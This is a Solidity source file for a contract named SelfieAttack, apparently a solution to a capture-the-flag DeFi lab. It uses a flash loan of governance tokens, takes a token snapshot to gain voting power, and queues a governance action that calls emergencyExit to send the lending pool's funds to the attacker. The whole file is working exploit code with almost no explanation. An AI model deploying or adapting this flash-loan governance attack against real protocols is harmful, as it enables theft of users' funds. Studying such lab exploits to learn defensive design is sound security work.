// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IERC20Snapshot is IERC20{
    function snapshot() external returns (uint256 lastSnapshotId);
}

interface ISimpleGovernance {
    struct GovernanceAction {
        uint128 value;
        uint64 proposedAt;
        uint64 executedAt;
        address target;
        bytes data;
    }

    error NotEnoughVotes(address who);
    error CannotExecute(uint256 actionId);
    error InvalidTarget();
    error TargetMustHaveCode();
    error ActionFailed(uint256 actionId);

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);
    function getActionDelay() external view returns (uint256 delay);
    function getGovernanceToken() external view returns (address token);
    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);
    function getActionCounter() external view returns (uint256);
}

interface IFlashLoanPool{
function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external;
}



contract SelfieAttack {
ISimpleGovernance public immutable simpleGov;
IERC20Snapshot public immutable token1;
IFlashLoanPool public immutable flashPool;
bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
address public immutable player;

constructor(address _flashLoanPool, address _token, address _simpleGov){
    flashPool = IFlashLoanPool(_flashLoanPool);
    token1 = IERC20Snapshot(_token);
    simpleGov = ISimpleGovernance(_simpleGov);
    player = msg.sender;
    }

function attack() external {
    flashPool.flashLoan(IERC3156FlashBorrower(address(this)), address(token1),1500000 ether, "");
}



function onFlashLoan (address initiator, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32){
    
    token1.snapshot();
  
    //queue emergency exit action
    bytes memory data1 = abi.encodeWithSignature("emergencyExit(address)", player);
    simpleGov.queueAction(address(flashPool), 0, data1);
    token1.approve(address(flashPool),amount);
    return CALLBACK_SUCCESS;
}



}